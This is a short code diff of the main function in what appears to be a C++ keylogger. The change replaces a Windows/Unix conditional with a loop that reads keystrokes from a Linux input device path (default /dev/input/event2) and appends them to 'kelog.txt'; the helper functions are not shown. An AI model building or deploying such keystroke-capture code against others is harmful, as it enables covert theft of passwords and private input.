@@ -3,18 +3,14 @@
 
 using namespace std;
 
-int main() {
-    #if defined(__WIN32) || defined(__CYGWIN__) || defined(__CYGWIN32)
-    cout << "Windows\r\n";
-    while (1) {
-        writeToFile("kelog.txt", getAscii(getPressedKeyboardState()));
+int main(int argc, char *argv[]) {
+    string s;
+    if (argc == 2) {
+        s += argv[1];
+    } else {
+         s += "/dev/input/event2";
     }
-    #elif __unix__
-    /*struct termios old, new;
-    tcgetattr( fileno( stdin ), &oldSettings );
-    newSettings = oldSettings;
-    newSettings.c_lflag &= (~ICANON & ~ECHO);
-    tcsetattr( fileno( stdin ), TCSANOW, &newSettings );*/
-    cout << "UNIX\n";
-    #endif
+    while (1) {
+        writeToFile("kelog.txt", getAscii(getPressedKeyboardState(s)));
+    }
 }
